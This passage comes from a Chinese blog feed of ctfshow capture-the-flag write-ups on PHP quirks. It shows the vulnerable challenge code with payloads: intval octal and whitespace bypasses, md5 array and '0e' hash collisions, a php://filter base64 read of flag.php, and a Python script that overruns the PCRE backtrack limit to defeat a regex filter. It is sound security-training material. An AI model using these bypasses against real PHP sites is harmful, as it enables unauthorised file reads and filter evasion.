class="token punctuation">)</span><span class="token operator">!==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf_show'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token number">123</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现可以使用+来代替。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">+</span><span class="token operator">.</span><span class="token operator">%</span><span class="token number">5</span>B<span class="token constant">_</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以最终结果为?ctf+show=ilove36d                    // 俺也是</p><h2 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$f1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$f2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$f1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$f1</span><span class="token punctuation">,</span><span class="token variable">$f2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"嗯哼？"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[0-9]|[a-z]/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token constant">NULL</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>考察点：gettext拓展的使用</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token function">gettext</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phpinfo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>结果  phpinfo<span class="token keyword">echo</span> <span class="token function">_</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phpinfo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>结果 phpinfo</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>相当于没用方法，直接输出了。</p><p>那么要获得$flag的值，我们可以直接使用get_defined_vars。</p><p>最后payload为</p><pre class="line-numbers language-none"><code class="language-none">payload:f1&#x3D;_&amp;f2&#x3D;get_defined_vars<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里可以使用两种方式，一个是远程文件包含，一个是php伪协议。</p><p>远程不知道为什么我不能使用</p><p>php伪协议支持多种协议，同时不识别的它直接舍弃。</p><p>payload：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">f<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/read/convert.base64-encode|ctfshow/resource=flag.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="web130"><a href="#web130" class="headerlink" title="web130"></a>web130</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/.+?ctfshow/is'</span><span class="token punctuation">,</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'bye!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'bye!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>考察点：利用正则最大回溯次数绕过</p><p>PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit<br>回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false。这样我们就可以绕过第一个正则表达式了。<br>python脚本如下</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">import requestsurl<span class="token operator">=</span><span class="token string double-quoted-string">"http://03771c3c-6afb-4457-a719-19cc6ccf922e.chall.ctf.show/"</span>data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'very'</span><span class="token operator">*</span><span class="token number">250000</span><span class="token operator">+</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">&#125;</span>r<span class="token operator">=</span>requests<span class="token operator">.</span><span class="token function">post</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token operator">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同时我们可以使用数组绕过。</p><p>f[]=ctfshow</p><h2 id="web131"><a href="#web131" class="headerlink" title="web131"></a>web131</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/.+?ctfshow/is'</span><span class="token punctuation">,</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'bye!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'36Dctfshow'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'bye!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>数组的绕过的方式没有办法再使用，因为多了stripos，所以还是老老实实的使用脚本吧。</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshowPHP特性</title>
      <link href="/2021/10/18/ctfshowphp-te-xing-shang/"/>
      <url>/2021/10/18/ctfshowphp-te-xing-shang/</url>
      
        <content type="html"><![CDATA[<h2 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h2><p>num=010574</p><p>8 进制</p><h2 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">===</span><span class="token string double-quoted-string">"4476"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-z]/i"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>核心函数为if(!strpos($num, “0”)){die(“no no no!”);}，意思为0不能出现在首位，所以我们一空格绕过，或者加个小数点.0</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?num&#x3D;4476.0?num&#x3D;%20010574?num&#x3D;+010574<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h2><p>这里运用八进制，添加空格的方式绕过。同时，过滤.0的方式</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">==</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-z]|\./i"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h2><p>很简单使用路径即可。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>u = ./flag.php</p><h2 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token keyword">else</span><span class="token keyword">print</span> <span class="token string single-quoted-string">'Wrong.'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token operator">?</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里牵扯到一个知识点。</p><blockquote><p>md5(array()) = null<br>    sha1(array()) = null<br>    ereg(pattern,array()) = null vs preg_match(pattern,array) = false<br>    strcmp(array(), “abc”) = null<br>    strpos(array(),”abc”) = null</p></blockquote><p>所以我们传入a[]=1&amp;b[]=2</p><h3 id="弱类型对比"><a href="#弱类型对比" class="headerlink" title="弱类型对比"></a>弱类型对比</h3><p>如果md5的对比时弱类型的我们可以找出md5后开头为0e的数。因为弱类型对比时，会首先转化为相同的类型，0e转化的将是0的科学计数法。于是，结果都为0。</p><p>下面我举出一些md5后为0e的字符串。</p><pre class="line-numbers language-none"><code class="language-none">ej0Dek06el08eo0ney0Mey0Oez0se006e10leU3ZeW3vfSoLfTohfTo1fUoUfYoufapFfbpffdpFfnpZfpprfqpafrpjfwpDfyp5f1p2f4pNf7pufDpQfHpPfIp4fJpXfLpvfOpifQp3fTpifVpzfeqNfjqNfvq1fyqyfAqJfEqkfFqgfFqifHqXfIqFfKqhfLq6fQq6fQqAfRqlfUq4fUqAfXq0fargfarJftrTf7rmfCrBfErYfIrtQNKCDZOs878926199as155964671as214587387as214587387as878926199a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_GET</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_POST</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag'</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_COOKIE</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag'</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_SERVER</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_FLAG'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag'</span><span class="token operator">?</span><span class="token variable">$flag</span><span class="token punctuation">:</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里牵扯到了三元运算符，我们切换成为if else，方便理解。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_POST</span><span class="token punctuation">;</span>       <span class="token comment">// 即$_GET方式变成了$_POST，之后等价替换即可</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_COOKIE</span>       <span class="token operator">/</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    flag<span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_SERVER</span><span class="token punctuation">:</span>       <span class="token operator">/</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    flag<span class="token punctuation">&#125;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_FLAG'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag'</span><span class="token operator">?</span><span class="token variable">$flag</span><span class="token punctuation">:</span><span class="token 